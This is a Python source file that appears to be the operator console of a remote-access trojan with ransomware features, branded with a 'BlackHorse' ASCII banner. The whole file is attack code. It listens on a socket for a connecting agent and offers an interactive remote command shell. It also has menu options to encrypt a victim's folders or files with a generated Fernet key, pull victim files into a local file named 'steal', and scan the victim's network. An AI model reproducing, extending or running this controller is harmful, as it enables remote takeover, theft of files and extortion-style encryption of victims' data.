from encodings.punycode import T
import socket
import os
import threading
from traceback import print_tb
from cryptography.fernet import Fernet

banner1 = '''
░█▀█░█░█░▀█▀░█▀█░░░█▄█░█▀█░█▀▄░█▀▀
░█▀█░█░█░░█░░█░█░░░█░█░█░█░█░█░█▀▀
░▀░▀░▀▀▀░░▀░░▀▀▀░░░▀░▀░▀▀▀░▀▀░░▀▀▀
'''

banner2 = '''
░▀█▀░█▀█░▀█▀░█▀▀░█▀▄░░░█▀█░█▀▀░▀█▀░▀█▀░█░█░█▀▀
░░█░░█░█░░█░░█▀▀░█▀▄░░░█▀█░█░░░░█░░░█░░▀▄▀░█▀▀
░▀▀▀░▀░▀░░▀░░▀▀▀░▀░▀░░░▀░▀░▀▀▀░░▀░░▀▀▀░░▀░░▀▀▀
'''

banner3 = r"""

_______     .---.        ____        _______   .--.   .--.  .---.  .---.     ,-----.    .-------.       .-'''-.     .-''-.   
\  ____  \   | ,_|     .'  __ `.    /   __  \  |  | _/  /   |   |  |_ _|   .'  .-,  '.  |  _ _   \     / _     \  .'_ _   \  
| |    \ | ,-./  )     /   '  \  \  | ,_/  \__) | (`' ) /    |   |  ( ' )  / ,-.|  \ _ \ | ( ' )  |    (`' )/`--' / ( ` )   ' 
| |____/ / \  '_ '`)   |___|  /  |,-./  )       |(_ ()_)     |   '-(_{;}_);  \  '_ /  | :|(_ o _) /   (_ o _).   . (_ o _)  | 
|   _ _ '.  > (_)  )      _.-`   |\  '_ '`)     | (_,_)   __ |      (_,_) |  _`,/ \ _/  || (_,_).' __  (_,_). '. |  (_,_)___| 
|  ( ' )  \(  .  .-'   .'   _    | > (_)  )  __ |  |\ \  |  || _ _--.   | : (  '\_/ \   ;|  |\ \  |  |.---.  \  :'  \   .---. 
| (_{;}_) | `-'`-'|___ |  _( )_  |(  .  .-'_/  )|  | \ `'   /|( ' ) |   |  \ `"/  \  ) / |  | \ `'   /\    `-'  | \  `-'    / 
|  (_,_)  /  |        \\ (_ o _) / `-'`-'     / |  |  \    / (_{;}_)|   |   '. \_/``".'  |  |  \    /  \       /   \       /  
/_______.'   `--------` '.(_,_).'    `._____.'  `--'   `'-'  '(_,_) '---'     '-----'    ''-'   `'-'    `-...-'     `'-..-' 

"""


HOST = "127.0.0.1"
PORT = 65449

running = True

key = Fernet.generate_key()

def set_up_sock():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen()
    global conn, addr
    conn, addr = s.accept()

def send(msg):
    try:
        conn.sendall((msg + "__END__").encode())
    except (ConnectionResetError, BrokenPipeError):
        raise ConnectionError("peer closed")

def recv():
    data = ""
    while "__END__" not in data:
        chunk = conn.recv(1024)
        if not chunk:
            raise ConnectionError("peer closed")
        data += chunk.decode(errors="replace")
    return data.replace("__END__", "")


def recv_loop():
    global running
    while True:
        try:
            data = recv()
        except ConnectionError:
            print("\n[!] connection lost with agent")
            running = False
            break
        if not data:
            break
        if data == "EXIT":
            running = False
            print("\n[Session closed]")
            break
        print("\r" + data)
        print("enter command : ", end="", flush=True)

def send_loop():
    global running
    
    while running:
        cmd = input()

        if cmd.lower() == "exit":
            try:
                send(cmd)
            except ConnectionError:
                 print("[!] connection already closed")
            running = False
            break

        if cmd.lower() == "cls":
            os.system("cls")
            print("enter command : ", end="", flush=True)
            continue
        try:
            send(cmd)
        except ConnectionError:
            print("[!] connection already closed")
            running = False
            break


def interactive(m : str):
    global running
    running = True 
    os.system("cls")
    print("\033[92m" + banner2 + "\033[0m")

    send(m)
    print (recv())    

    threading.Thread(target=recv_loop, daemon=True).start()
    send_loop()
    os.system("cls")
            
        
def enc_folder():
    send("1")
    path = input("path : ")
    send(path)
    print(recv())
    print (f"key is : {key}")                        
    send(key.decode())
    print(recv())
    sure = input("Are you sure y or n : ").lower()
    if sure == "y":
        send("y")
        print(recv())
        print(recv())    
    else:
        send("n")
        print(recv())

def enc_file():
    send("2")
    path = input("path/file  : ")
    send(path)
    print(recv())
    print (f"key is : {key}")                        
    send(key.decode())
    print(recv())
    sure = input("Are you sure y or n : ").lower()
    if sure == "y":
        send("y")
        print(recv())
        print(recv())
    else:
        send("n")
        print(recv())
        return


def get_file():
    send("3")
    print(recv())    
    file = input("select the file :")
    send(file)
    if file.lower() == "exit":
        return
    try:
        data = recv().encode("latin-1")
        with open("steal", "wb") as f:
            f.write(data)
    except Exception:
        pass
    return
    

def scaning():
    send("4")
    print(recv())    
    flag = True
    while flag:
        value = recv()
        print(f"{value}\n")
        if value == "done":
            flag = False
            break        
    

def Automode():
    global key
    send("2")
    os.system("cls")
    print("\033[92m" + banner1 + "\033[0m")
    dirc = recv()
    print(f"{dirc}")
    while True:
        print("""
Actions :
1 - Encrypt Folder
2 - Encrypt File
3 - Get File
4 - Scan Network 
5 - Exit
""")        
        choice = input("Choose option: ")
        
        if choice == "1":            
            enc_folder()

        elif choice == "2":            
            enc_file()

        elif choice == "3":
            get_file()

        elif choice == "4":
            scaning()
        elif choice == "5":
            send("5")
            os.system("cls")
            break


        else:
            continue


def main_banner():
    os.system("cls")
    print("\033[92m" + banner3 + "\033[0m")
    print("Wlc to your pretty world")    
    
def main():            
    main_banner()
    print("waiting connection.....")        
    set_up_sock()
    back = recv()
    print(f"Connected by  {back} , {addr}")    

    while True:
        main_banner()
        print(f"Connected by  {back} , {addr}")    
        print("Insert mode : \n 1 for Interactive  \n 2 for Auto mode \n 3 for exit")
        data = input("enter mode  : ")
        try:
            if data == "1":
                interactive(data)
                os.system("cls")
            elif data =="2":
                Automode()
                os.system("cls")
            elif data =="3":
                send("3")
                exit(0)
            else:
                continue
        except ConnectionError:
            print("\n[!] connection lost with agent")
            return


if __name__ == "__main__":
    main()